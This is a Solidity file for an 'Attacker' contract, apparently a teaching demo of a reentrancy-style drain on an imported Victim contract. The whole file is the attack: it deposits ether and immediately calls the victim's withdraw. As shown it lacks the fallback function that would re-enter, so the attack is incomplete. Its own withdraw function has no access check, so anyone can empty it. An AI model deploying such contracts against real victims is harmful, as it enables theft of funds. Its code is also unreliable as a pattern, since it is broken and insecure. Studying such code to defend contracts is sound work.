//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import './Victim.sol';

contract Attacker{
    Victim public victim;

    constructor (address _victim){
        victim = Victim(_victim);
    }

    function attack() public payable{
        require(msg.value > 0, "You ether to attack the contract.");
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
